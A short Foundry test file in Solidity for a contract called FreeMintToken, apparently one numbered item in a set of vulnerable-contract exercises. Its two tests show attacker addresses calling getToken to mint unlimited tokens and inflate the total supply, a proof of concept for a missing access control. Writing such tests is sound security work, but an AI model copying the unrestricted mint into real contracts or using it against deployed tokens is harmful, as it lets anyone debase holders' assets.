// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/A24.sol";

contract A24Test is Test {
    FreeMintToken token;
    address admin = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        token = new FreeMintToken();
    }

    function testInfiniteMintExploit() public {
        // 1. Initial supply check
        assertEq(token.totalSupply(), 1000000 * 10**18);

        // 2. Attacker mints 1 billion tokens
        vm.prank(attacker);
        token.getToken(1_000_000_000 * 10**18);

        // 3. Verify inflation attack
        assertEq(token.balanceOf(attacker), 1_000_000_000 * 10**18);
        assertEq(token.totalSupply(), 1_001_000_000 * 10**18); // Original + new minted
    }

    function testMultipleAttackers() public {
        // 1. First attacker mints
        vm.prank(attacker);
        token.getToken(500_000 * 10**18);

        // 2. Second attacker mints
        vm.prank(address(0x3));
        token.getToken(1_000_000 * 10**18);

        // 3. Check total inflation
        assertEq(token.totalSupply(), 1000000 * 10**18 + 1_500_000 * 10**18);
    }
}